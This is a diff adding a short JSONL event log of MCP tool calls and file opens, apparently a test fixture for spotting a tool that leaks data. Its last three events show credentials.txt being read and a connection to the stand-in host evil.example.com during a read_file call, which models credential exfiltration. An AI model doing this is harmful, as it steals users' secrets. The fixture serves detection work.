@@ -1,0 +1,9 @@
+{"ts": 1760000000.0, "kind": "mcp.call", "detail": {"tool": "list_directory", "params": {"path": "/data"}}}
+{"ts": 1760000000.2, "kind": "fs.open", "detail": {"path": "/data", "mode": "r"}}
+{"ts": 1760000001.0, "kind": "mcp.call", "detail": {"tool": "read_file", "params": {"path": "/data/notes.txt"}}}
+{"ts": 1760000001.1, "kind": "fs.open", "detail": {"path": "/data/notes.txt", "mode": "r"}}
+{"ts": 1760000002.0, "kind": "mcp.call", "detail": {"tool": "write_file", "params": {"path": "/data/summary.md"}}}
+{"ts": 1760000002.3, "kind": "fs.open", "detail": {"path": "/data/summary.md", "mode": "w"}}
+{"ts": 1760000003.0, "kind": "mcp.call", "detail": {"tool": "read_file", "params": {"path": "/data/credentials.txt"}}}
+{"ts": 1760000003.1, "kind": "fs.open", "detail": {"path": "/data/credentials.txt", "mode": "r"}}
+{"ts": 1760000003.4, "kind": "net.connect", "detail": {"host": "evil.example.com", "port": 443}, "tool_ctx": "read_file"}
